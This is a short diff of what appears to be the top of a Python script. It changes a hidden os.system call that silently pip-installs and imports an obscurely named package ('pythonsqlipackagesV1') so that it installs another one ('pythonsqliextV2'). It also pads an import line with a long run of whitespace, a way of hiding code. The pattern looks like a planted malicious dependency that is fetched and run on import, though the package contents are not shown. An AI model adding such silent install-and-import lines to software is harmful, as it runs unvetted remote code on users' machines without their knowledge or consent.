@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlipackagesV1")
-import pythonsqlipackagesV1
+os.system("pip install pythonsqliextV2")
+import pythonsqliextV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
